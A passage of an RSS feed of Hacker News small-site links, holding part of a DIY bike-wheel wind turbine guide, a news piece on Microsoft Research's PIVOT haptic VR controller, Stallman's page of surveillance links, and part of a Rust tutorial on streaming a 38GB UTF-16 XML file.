            <td><p><strong>Sticky Tape</strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/peg1.jpg" alt="" width="80" height="80"></td>
            <td><strong>4 Clothes Pegs</strong><br>
              Springy or the other kind.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/printer1.jpg" alt="" width="80" height="80"></td>
            <td><strong>Computer and printer</strong><br>
Low quality black and  white is fine.<br>
And 2 pieces of A4 or US Letter paper.</td>
          </tr>
          <tr>
            <td>              <p><strong>Optional:</strong></p></td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/7mmsocket1.jpg" alt="" width="80" height="80"></td>
            <td>
              
              
              <p><strong>7mm Socket / Nut Driver<br>
              </strong>For use with the drill to tighten your  bolts. Much faster and easier.</p></td>
          </tr>
        </tbody></table>
        <p><a name="mat" id="mat"></a><strong>Materials:</strong></p>
<table>
          <tbody><tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/aluplate1.jpg" width="80" height="80"></td>
            <td><strong>11 Aluminium lithographic offset printing plates<br>
            </strong>These are pure aluminium sheets used in a printing process fairly common with newspapers and packaging. A medium sized printing company may recycle hundreds of plates every week, so it's usually easy to pick them up cheap. Ring around any local companies offering offset printing.<br>
Any size, thickness, or type is fine as long as they're larger than 67cm on the long axis.
              They'll probably be quite inky when you get them, it washes off your hands easily enough with soap and should be non toxic.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/rivet1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>150</strong><strong> 4mm </strong><strong>D</strong><strong>iameter </strong><strong>P</strong><strong>op </strong><strong>R</strong><strong>ivets</strong> <br>
              About 6-8mm  long. </p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m4bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>B</strong><strong>olts / </strong><strong>Machine  Screws<br>
            </strong>About 12-20mm long, hex heads are best.</p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/nylock1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>N</strong><strong>yl</strong><strong><strong>ocs</strong></strong><strong> / </strong><strong>Lock Nuts<br>
  </strong>These are nuts with a ring of nylon to  stop them rattling loose. If you can't find these a normal M4 nut  with a spring washer will do the same job.</p>
</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/washer2.jpg" alt="" width="80" height="80"></td>
            <td><strong>24 Small Washers  <br>
            </strong>            4mm inner diameter to fit the pop rivets and bolts, outer diameter about 10mm.<br>            </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/pennywasher1.jpg" alt="" width="80" height="80"></td>
            <td>
              <p><strong>27 Large/Penny/Repair </strong><strong>W</strong><strong>ashers</strong> <br>
      4mm inner  diameter to fit the pop rivets and bolts, outer diameter about 20mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikewheel1.jpg" width="80" height="80"></td>
            <td><p><strong>26 Inch </strong><strong>B</strong><strong>ike </strong><strong>W</strong><strong>heel<br>
              </strong>Exactly how  bike wheels are measured is slightly complicated, basically you want  one which is about 58cm total outer rim diameter, give or take. <br>
              The  wheel should:<br>
              ~ Not be quick release <br>
              ~ Have a normal thick  axle (about 10mm diameter)<br>
              ~ Have 36 spokes<br>
              ~ Run reasonably  smoothly <br>
              ~ Have enough axle showing to attach to your pole  mount, at least 3-4cm.<br>
            ~ Only needs gears if you're going to be running a chain off them, which you probably aren't.</p>              <p>It may be helpful to take the wheel  hub apart using spanners and a bike cone spanner and give the  bearings a bit of a clean and re-grease, and to extend the axle as  much as possible on one side for attaching. If you've not done this  before take it along to your local bike servicing place and they'll  be happy to show you how. Shouldn't be necessary tho if the wheel  runs nicely enough and has enough axle showing.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/spokes1.jpg" width="80" height="80"></td>
            <td><strong>12 bike wheel spokes</strong>
            <p>Any length, type, or condition is fine.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/flatsteel1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>2 </strong><strong>S</strong><strong>trips of </strong><strong>S</strong><strong>teel</strong><br>
      Roughly 20cm x 3cm x 3mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikeaxle1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>Spare B</strong><strong>ike Wheel Axle and  Three Nuts To Fit</strong><br>
      Anything as long as it's the same thread  as the axle on your wheel.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m6bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>3 M6 x About 60mm Bolts and Nuts<br>
            </strong><span>You'll  want them with small hex heads.</span></p>
              </td>
          </tr>
        </tbody></table>
<h3><a name="resources" id="steps2"></a>Resources:</h3>

<p><a name="steps" id="steps"></a>
<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://opensourcelowtech.org/wind_turbine.html">http://opensourcelowtech.org/wind_turbine.html</a></em></p>]]>
            </description>
            <link>http://opensourcelowtech.org/wind_turbine.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865731</guid>
            <pubDate>Fri, 23 Oct 2020 03:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Research presents PIVOT, placing VR objects into your hand]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24865195">thread link</a>) | @vrfinal
<br/>
October 22, 2020 | https://www.vrfinal.com/microsoft-research-pivot-haptic-vr-handhelds/ | <a href="https://web.archive.org/web/*/https://www.vrfinal.com/microsoft-research-pivot-haptic-vr-handhelds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <figure><iframe width="612" height="344" src="https://www.youtube.com/embed/kj3RdeJUJos?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>It does look a bit sinister when you're using it to grab rabbits, though.</figcaption></figure><p>We've had a summer of fantastic new haptic VR controller designs.</p><p>From <a href="https://www.vrfinal.com/new-vr-controller-a-game-changer-in-immersive-combat/">Tactical Haptics' game-changing VR sabre</a> to <a href="https://www.vrfinal.com/sony-patent-hints-at-next-gen-psvr-controllers/">Sony's latest PS VR patents</a>, developers are hard at work realising fantasy and making VR more immersive than ever.</p><p>This week, Microsoft announced Haptic PIVOT, the latest in a long line of haptic VR controllers developed by the company's Research wing. The project's ambition is simple: to move us towards a VR experience in which "feelings will be on par with the awe-inspiring and realistic renderings being produced today by head-mounted displays."</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg 1000w, https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg 1024w" sizes="(min-width: 720px) 720px"><figcaption>PIVOT mounts on your wrist and only comes out when it's required. (Credit: Microsoft Research)</figcaption></figure><p><a href="https://www.microsoft.com/en-us/research/blog/physics-matters-haptic-pivot-an-on-demand-controller-simulates-physical-forces-such-as-momentum-and-gravity/">In a statement released by the company</a>, Microsoft Researched explained the thinking behind their latest device:</p><blockquote>When you reach out an empty hand to pick an apple from a tree, you’re met with a variety of sensations—the firmness of the apple as you grip it, the resistance from the branch as you tug the apple free, the weight of the apple in your palm once you’ve plucked it, and the smooth, round surface under your fingertips.</blockquote><p>"If Sir Isaac Newton were to have found the inspiration for his laws of motion and gravity from a <em>virtual </em>apple falling from a <em>virtual</em> tree," the statement continues, "he would have needed a controller like PIVOT."</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-_figure1-1.png" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/10/Haptic-Pivot-_figure1-1.png 600w, https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-_figure1-1.png 627w"><figcaption>The haptic device uses a retractable handle to replicate the real life physics of interacting with objects. (Credit: Microsoft Research)</figcaption></figure><p>PIVOT is quite simple. When a user approaches an interactable object in VR, the robotised haptic handle deploys toward the user's palm.</p><p>It is a wrist mounted haptic device which - by rendering the "momentum and drag of thrown and caught objects" - is able to convincingly emulate the sensation of interacting with real physical objects. This means PIVOT goes far further than allowing users to grasp objects, but also drop, throw and catch them, too.</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/Pivot-GIF-1.gif" alt=""><figcaption>(Credit: Microsoft Research)</figcaption></figure><p>The tech inside the device is so efficient that the handle can go from grasp to fully retracted (at approximately 190 degrees) in just 340 milliseconds. In other words, the time it takes to blink an eye.</p><p>We already knew that the convincing emulation of touch could be the final challenge before developers can offer <em>fully immersive</em> virtual reality experiences. Microsoft Research's PIVOT could be a big step towards that.</p><p>And if you think this is awesome, wait until you see what Facebook is cooking up - <em><a href="https://www.vrfinal.com/facebook-develops-new-hand-tracking-software-to-type-in-vr-without-a-keyboard/">VR keyboard control simply by tracking your hands</a></em>.</p>
          </div></div>]]>
            </description>
            <link>https://www.vrfinal.com/microsoft-research-pivot-haptic-vr-handhelds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865195</guid>
            <pubDate>Fri, 23 Oct 2020 01:31:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. faculty job market tanks]]>
            </title>
            <description>
<![CDATA[
Score 255 | Comments 258 (<a href="https://news.ycombinator.com/item?id=24864838">thread link</a>) | @SQL2219
<br/>
October 22, 2020 | https://sci-hub.st/10.1126/science.370.6514.272 | <a href="https://web.archive.org/web/*/https://sci-hub.st/10.1126/science.370.6514.272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.st/10.1126/science.370.6514.272</link>
            <guid isPermaLink="false">hacker-news-small-sites-24864838</guid>
            <pubDate>Fri, 23 Oct 2020 00:20:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everyone has a reason to fear (and fight against) surveillance (2017)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24863684">thread link</a>) | @crazypython
<br/>
October 22, 2020 | https://stallman.org/something-to-fear.html | <a href="https://web.archive.org/web/*/https://stallman.org/something-to-fear.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<h2><a href="https://stallman.org/">https://stallman.org</a></h2>
<p>
For current political commentary, see
the <a href="https://stallman.org/archives/polnotes.html">daily
political notes</a>.
</p>
<p>
<a href="https://stallman.org/biographies.html#serious">RMS' Bio</a> |
<a href="http://gnu.org/">The GNU Project</a>
</p>

<hr>



<h2>2017-05-03</h2>

<p>
  <a href="http://privacysos.org/node/1325">Nothing to hide.</a>
</p>

<p>
  <a href="http://www.thoughtcrime.org/blog/we-should-all-have-something-to-hide/">We Should All Have Something To Hide</a>
</p>

<p>
  <a href="http://www.guardian.co.uk/technology/blog/2013/jun/14/nsa-prism">The NSA's Prism</a>
</p>

<p>
  <a href="https://www.aclu.org/blog/national-security/you-may-have-nothing-hide-you-still-have-something-fear">You May Have 'Nothing to Hide' But You Still Have Something to Fear</a>
</p>

<p>
  <a href="http://www.theguardian.com/commentisfree/2015/sep/17/ahmed-mohamed-istandwithahmed-counter-terror-andrew-parker">#IStandWithAhmed</a>
</p>

<p>
  In fact,
  <a href="https://theintercept.com/2016/04/28/new-study-shows-mass-surveillance-breeds-meekness-fear-and-self-censorship/">
  masses of people are inhibited by fear of pervasive
  surveillance:</a> after Snowden showed everyone how much the US tracks
  people's browsing, there was a 20% decrease in visits to Wikipedia
  pages about topics relating to terrorism.
</p>

<p>
  This is in addition to the fact that massive surveillance
  <a href="https://gnu.org/philosophy/surveillance-vs-democracy.html">endangers
democracy</a>, and that harms all of us.
</p>

<p>
Copyright (c) 2016, 2017 Richard Stallman
Verbatim copying and redistribution of this entire page are
permitted provided this notice is preserved.
</p>


</div>]]>
            </description>
            <link>https://stallman.org/something-to-fear.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24863684</guid>
            <pubDate>Thu, 22 Oct 2020 21:50:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XMHell: Handling 38GB of UTF-16 XML with Rust]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 58 (<a href="https://news.ycombinator.com/item?id=24863352">thread link</a>) | @aazaa
<br/>
October 22, 2020 | http://usethe.computer/posts/14-xmhell.html | <a href="https://web.archive.org/web/*/http://usethe.computer/posts/14-xmhell.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

        
        <h3>2020-05-11</h3>

<p>A couple weekends ago, I found myself with the desire to fetch oil and gas production data for a specific county in New Mexico from the <a href="http://www.emnrd.state.nm.us/OCD/">New Mexico Oil Conservation Division</a> (OCD).</p>
<p>Fortunately, the OCD provides access to historical well production via an FTP server. I worked out that I needed to download <code>/Public/OCD/OCD Interface v1.1/volumes/wcproduction/wcproduction.zip</code>… and then my fortune ran out.</p>
<p>The first thing I noticed was the file size. The OCD doesn’t seem to provide a way to query a limited time- or area-based subset of production history data, so we’re stuck with a single zip file for “all of New Mexico since the dawn of time”<a href="#fn1" id="fnref1"><sup>1</sup></a>. The result is a whopping 712MB ZIP file.</p>
<p>Here’s where I knew I was in trouble: the only thing inside was a single 38 GB file called <code>wcproduction.xml</code>.</p>
<h3>“XML is like violence: when it fails, apply more”</h3>
<p>XML—the “extensible markup language”. Along with Java’s <code>AbstractBeanFactoryTemplateFactory</code>s, and the entirety of Geocities, XML epitomizes the excesses of the late 90s and early 2000s computing culture.</p>
<p>No two parsers can ever quite seem to agree on the details, and the verbosity quotient is such that an attempt to “print source” for the average “XHTML” web site circa 2001 would be likely to completely deforest the Amazon. The one thing that can be said in its favor is that it can indeed be used to somewhat faithfully represent a tree (the in-memory hierarchical structure, not the thing we just killed millions of).</p>
<p>Enough griping, though: the “XML everywhere” wave has long subsided. We’ve got to figure out how to deal with what it left behind. While it’s the most common approach to parsing XML, it’s also clear that loading the entire file into memory is unlikely to work: the workstation I’m writing this on only has 32GB of RAM. Additionally, it doesn’t make sense to build a syntax tree for the entire document when we are only interested in a small subset of the data. The XML world refers to this—here, unworkable—approach as a “DOM parser”, but it’s just the common case of parsing for any formal language—we incrementally construct an in-memory representation (that is, a syntax tree) of an entire document. It works well when we need the entire result and the in-memory representation fits comfortably within our resource budget: for instance, when compiling computer programs from source code, or rendering a web page from HTML.</p>
<p>Instead, we’ll use a streaming approach (the XML folks call this “SAX”, for reasons I didn’t care enough to research). In this approach, we’ll parse the document incrementally and receive results via an event-based API. This will let us only handle the data we care about, and minimize the amount we need to keep in memory at once.</p>
<p>For good performance on this “huge” data set, and to leverage an easily-accessible ecosystem of libraries which includes both streaming ZIP archive handling and high-performance streaming XML parsers, we’ll write a data extraction program in the <a href="https://www.rust-lang.org/">Rust</a> programming language.</p>
<h3>(Re)Write It In Rust</h3>
<p><img alt="Rust Evangelism Strike Force logo" width="400px" src="http://usethe.computer/images/resf.png"></p>
<p>I’m not going to belabor the reasons Rust is exciting here. It’s a statically-typed, compiled language with a nice mix of performance and control, expressiveness, and safety. I find it to be a nice choice for the sorts of “systems programming” tasks in which I might also use C or C++, but the build tools and package management system (<a href="https://crates.io/">Cargo</a>) also make it a viable choice for these sorts of “script-like” programs, especially when performance may be an issue.</p>
<p>Let’s begin by creating a new Rust project using Cargo. We want a program (binary), not a library:</p>
<pre><code>$ cargo new ocd_production --bin</code></pre>
<p>That’ll create a new directory <code>ocd_production</code> containing a Rust project. Inside we have a “hello world” program in <code>src/main.rs</code> and a specification for the project in <code>Cargo.toml</code>. The directory is also a <code>git</code> repository, which is handy.</p>
<p>There’s no sense in unpacking the ZIP file when we can stream our XML file out of it using the <a href="https://crates.io/crates/zip"><code>zip</code></a> library. Let’s begin by just previewing the text of the XML file.</p>
<p>We’ll add <code>zip</code> to our <code>Cargo.toml</code>:</p>
<pre><code>[package]
name = "ocd_production"
version = "0.1.0"
authors = ["Derrick W. Turk &lt;dwt@terminusdatascience.com&gt;"]
edition = "2018"

[dependencies]
zip = "0.5.5"</code></pre>
<p>A caveat before we begin: this is going to be “script” quality code. My goal is to process one file quickly and reliably, not to build a reusable library or produce “production-ready” code. As such, this code is going to skip some “best practices”: everything will be in one long <code>main.rs</code> file, and error handling will be oriented toward catching error conditions and aborting the program rather than toward error recovery or human-friendly error messages.</p>
<p>With that in mind, let’s write a short program in <code>src/main.rs</code> to take a ZIP file path as a command-line argument, and stream a few KB at a time from the file contained inside:</p>
<pre id="cb3"><code><a id="cb3-1" data-line-number="1"><span>use</span> std::<span>{</span></a>
<a id="cb3-2" data-line-number="2">    env,</a>
<a id="cb3-3" data-line-number="3">    error::Error,</a>
<a id="cb3-4" data-line-number="4">    fs::File,</a>
<a id="cb3-5" data-line-number="5">    io::Read,</a>
<a id="cb3-6" data-line-number="6">    <span>str</span>,</a>
<a id="cb3-7" data-line-number="7"><span>}</span>;</a>
<a id="cb3-8" data-line-number="8"></a>
<a id="cb3-9" data-line-number="9"><span>use</span> zip::ZipArchive;</a>
<a id="cb3-10" data-line-number="10"></a>
<a id="cb3-11" data-line-number="11"><span>const</span> BUF_SIZE: <span>usize</span> = <span>4096</span>; <span>// 4kb at once</span></a>
<a id="cb3-12" data-line-number="12"></a>
<a id="cb3-13" data-line-number="13"><span>fn</span> main() -&gt; <span>Result</span>&lt;(), <span>Box</span>&lt;dyn Error&gt;&gt; <span>{</span></a>
<a id="cb3-14" data-line-number="14">    <span>let</span> path = env::args().nth(<span>1</span>).ok_or(<span>"no filename provided"</span>)?;</a>
<a id="cb3-15" data-line-number="15">    <span>let</span> zipfile = File::open(path)?;</a>
<a id="cb3-16" data-line-number="16">    <span>let</span> <span>mut</span> zip = ZipArchive::new(zipfile)?;</a>
<a id="cb3-17" data-line-number="17"></a>
<a id="cb3-18" data-line-number="18">    <span>if</span> zip.len() != <span>1</span> <span>{</span></a>
<a id="cb3-19" data-line-number="19">        <span>Err</span>(<span>"expected one file in zip archive"</span>)?;</a>
<a id="cb3-20" data-line-number="20">    <span>}</span></a>
<a id="cb3-21" data-line-number="21"></a>
<a id="cb3-22" data-line-number="22">    <span>let</span> <span>mut</span> xmlfile = zip.by_index(<span>0</span>)?;</a>
<a id="cb3-23" data-line-number="23">    <span>println!</span>(<span>"file is {}, size {} bytes"</span>, xmlfile.name(), xmlfile.size());</a>
<a id="cb3-24" data-line-number="24"></a>
<a id="cb3-25" data-line-number="25">    <span>let</span> <span>mut</span> buf = <span>[</span><span>0u8</span>; BUF_SIZE<span>]</span>;</a>
<a id="cb3-26" data-line-number="26">    <span>loop</span> <span>{</span></a>
<a id="cb3-27" data-line-number="27">        <span>if</span> xmlfile.read(&amp;<span>mut</span> buf<span>[</span>..<span>]</span>)? == <span>0</span> <span>{</span></a>
<a id="cb3-28" data-line-number="28">            <span>break</span>;</a>
<a id="cb3-29" data-line-number="29">        <span>}</span></a>
<a id="cb3-30" data-line-number="30"></a>
<a id="cb3-31" data-line-number="31">        <span>println!</span>(<span>"read chunk: {}"</span>, <span>str</span>::from_utf8(&amp;buf<span>[</span>..<span>]</span>)?);</a>
<a id="cb3-32" data-line-number="32">    <span>}</span></a>
<a id="cb3-33" data-line-number="33"></a>
<a id="cb3-34" data-line-number="34">    <span>Ok</span>(())</a>
<a id="cb3-35" data-line-number="35"><span>}</span></a></code></pre>
<p>We’ll compile in “release mode” (that is, with optimizations enabled) and run against the ZIP file:</p>
<pre><code>$ cargo run --release wc_production.zip</code></pre>
<blockquote>
<p><code>file is wcproduction.xml, size 38535541060 bytes</code><br>
<code>Error: Utf8Error { valid_up_to: 0, error_len: Some(1) }</code></p>
</blockquote>
<p>That’s discouraging.</p>
<h3>Only 90s Kids Will Remember This File Encoding</h3>
<p>Like many “modern” languages, Rust’s standard string type is a <a href="https://en.wikipedia.org/wiki/UTF-8">UTF-8</a> encoded <a href="https://home.unicode.org/">Unicode</a> string. This is the right answer for a <a href="https://utf8everywhere.org/">lot of good reasons</a>, but it’s only become popular in recent years.</p>
<p>In this case, we’ve clearly encountered some text which is not encoded in UTF-8. In fact, we’ve hit an invalid byte as the very first byte. Let’s look at raw bytes, rather than Rust strings, so that we can see what’s going on. We’ll edit <code>src/main.rs</code>:</p>
<pre id="cb5"><code><a id="cb5-1" data-line-number="1"><span>use</span> std::<span>{</span></a>
<a id="cb5-2" data-line-number="2">    env,</a>
<a id="cb5-3" data-line-number="3">    error::Error,</a>
<a id="cb5-4" data-line-number="4">    fs::File,</a>
<a id="cb5-5" data-line-number="5">    io::Read,</a>
<a id="cb5-6" data-line-number="6">    <span>str</span>,</a>
<a id="cb5-7" data-line-number="7"><span>}</span>;</a>
<a id="cb5-8" data-line-number="8"></a>
<a id="cb5-9" data-line-number="9"><span>use</span> zip::ZipArchive;</a>
<a id="cb5-10" data-line-number="10"></a>
<a id="cb5-11" data-line-number="11"><span>const</span> BUF_SIZE: <span>usize</span> = <span>4096</span>; <span>// 4kb at once</span></a>
<a id="cb5-12" data-line-number="12"></a>
<a id="cb5-13" data-line-number="13"><span>fn</span> main() -&gt; <span>Result</span>&lt;(), <span>Box</span>&lt;dyn Error&gt;&gt; <span>{</span></a>
<a id="cb5-14" data-line-number="14">    <span>let</span> path = env::args().nth(<span>1</span>).ok_or(<span>"no filename provided"</span>)?;</a>
<a id="cb5-15" data-line-number="15">    <span>let</span> zipfile = File::open(path)?;</a>
<a id="cb5-16" data-line-number="16">    <span>let</span> <span>mut</span> zip = ZipArchive::new(zipfile)?;</a>
<a id="cb5-17" data-line-number="17"></a>
<a id="cb5-18" data-line-number="18">    <span>if</span> zip.len() != <span>1</span> <span>{</span></a>
<a id="cb5-19" data-line-number="19">        <span>Err</span>(<span>"expected one file in zip archive"</span>)?;</a>
<a id="cb5-20" data-line-number="20">    <span>}</span></a>
<a id="cb5-21" data-line-number="21"></a>
<a id="cb5-22" data-line-number="22">    <span>let</span> <span>mut</span> xmlfile = zip.by_index(<span>0</span>)?;</a>
<a id="cb5-23" data-line-number="23">    <span>println!</span>(<span>"file is {}, size {} bytes"</span>, xmlfile.name(), xmlfile.size());</a>
<a id="cb5-24" data-line-number="24"></a>
<a id="cb5-25" data-line-number="25">    <span>let</span> <span>mut</span> buf = <span>[</span><span>0u8</span>; BUF_SIZE<span>]</span>;</a>
<a id="cb5-26" data-line-number="26">    <span>loop</span> <span>{</span></a>
<a id="cb5-27" data-line-number="27">        <span>if</span> xmlfile.read(&amp;<span>mut</span> buf<span>[</span>..<span>]</span>)? == <span>0</span> <span>{</span></a>
<a id="cb5-28" data-line-number="28">            <span>break</span>;</a>
<a id="cb5-29" data-line-number="29">        <span>}</span></a>
<a id="cb5-30" data-line-number="30"></a>
<a id="cb5-31" data-line-number="31">        <span>println!</span>(<span>"read chunk: {:?}"</span>, &amp;buf<span>[</span>..<span>]</span>);</a>
<a id="cb5-32" data-line-number="32">        <span>// we'll just dump the first chunk so we can see what's going on</span></a>
<a id="cb5-33" data-line-number="33">        <span>break</span>;</a>
<a id="cb5-34" data-line-number="34">    <span>}</span></a>
<a id="cb5-35" data-line-number="35"></a>
<a id="cb5-36" data-line-number="36">    <span>Ok</span>(())</a>
<a id="cb5-37" data-line-number="37"><span>}</span></a></code></pre>
<blockquote>
<p><code>file is wcproduction.xml, size 38535541060 bytes</code><br>
<code>read chunk: [255, 254, 60, 0, 114, 0, 111, 0, 111, 0, 116, 0, 32, 0, 120, 0, 109, 0, 108, 0, 110, 0, 115, 0, 58, 0, 120, 0, 115, 0, 105, 0, 61, 0, 34, 0, 104, 0, 116, 0, 116, 0, 112, 0, 58, 0, 47, 0, 47, 0, 119, 0, 119, 0, 119, 0, 46, 0, 119, 0, 51, 0, 46, 0, 111, 0, 114, 0, 103, 0, 47, 0, 50, 0, 48, 0, 48, 0, 49, 0, 47, 0, 88, 0, 77, 0, 76, 0, 83, 0, 99, 0, 104, 0, 101, 0, 109, 0, 97, 0, 45, 0, 105, 0, 110, 0, 115, 0, 116, 0, 97, 0, 110, 0, 99, 0, 101, 0, 34, 0, 62, 0, 60, 0, 120, 0, 115, 0, 100, 0, 58, 0, 115, 0, 99, 0, 104, 0, 101, 0, 109, 0, 97, 0, 32, 0, 116, 0, 97, 0, 114, 0, 103, 0, 101, 0, 116, 0, 78, 0, 97, 0, ...</code></p>
</blockquote>
<p>At this point, recovering Windows programmers and Java programmers are wincing in sympathy. Two things immediately stand out: first, we’ve got a series of bytes alternating between the printable ASCII range and zero, and second, we open with <code>0xFF 0xFE</code>—that’s a <a href="https://en.wikipedia.org/wiki/Byte_order_mark">BOM</a>. We’re dealing with <a href="https://en.wikipedia.org/wiki/UTF-16">UTF-16</a> in <a href="https://en.wikipedia.org/wiki/Endianness">little-endian</a> byte order.</p>
<p>If you want the short version of how we got here, I suggest reading <a href="https://www.kingjamesbibleonline.org/Genesis-Chapter-11/">Chapter 11 of the Book of Genesis</a>.</p>
